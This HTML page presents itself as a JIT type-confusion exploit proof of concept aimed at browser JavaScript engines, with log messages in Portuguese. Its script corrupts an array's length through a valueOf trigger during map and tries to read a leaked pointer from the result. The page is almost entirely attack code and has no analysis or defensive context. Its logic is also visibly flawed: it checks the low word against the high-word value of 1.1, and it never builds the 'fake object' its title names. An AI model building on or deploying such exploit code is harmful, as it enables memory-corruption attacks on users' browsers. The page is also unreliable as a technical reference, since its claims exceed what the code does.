<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Type Confusion + Fake Object PoC</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>JIT Type Confusion Exploit</h1>
  <pre id="log">Carregando...</pre>
  <script>
    const log = (msg) => {
      const logEl = document.getElementById('log');
      logEl.textContent += msg + '\n';
    };

    log('Iniciando Type Confusion...');

    function createCorruptedArray() {
      let trigger = {
        valueOf: function () {
          log('[Hijack] valueOf ativado!');
          arr.length = 1;  // Confunde o otimizador
          return 3;
        }
      };

      let arr = [1.1, 1.1, 1.1];
      let result = arr.map((x, i, a) => {
        if (i === 1) {
          a.length = trigger;
        }
        return x;
      });

      return result;
    }

    function floatToUint64(f) {
      let float64 = new Float64Array(1);
      let uint32 = new Uint32Array(float64.buffer);
      float64[0] = f;
      return [uint32[0], uint32[1]];
    }

    try {
      let result = createCorruptedArray();
      log(`[Resultado] ${result}`);
      log(`[Tipo] typeof result[1]: ${typeof result[1]}`);

      let leak = result[1];
      if (typeof leak === "number") {
        let [lo, hi] = floatToUint64(leak);
        log(`[Leak?] 0x${hi.toString(16)}${lo.toString(16)}`);
        if (lo !== 0x3ff19999) log('[!] Possível leitura corrompida ou ponteiro!');
      }

      log('\nExploração concluída.');

    } catch (e) {
      log('Falha: ' + e);
    }
  </script>
</body>
</html>
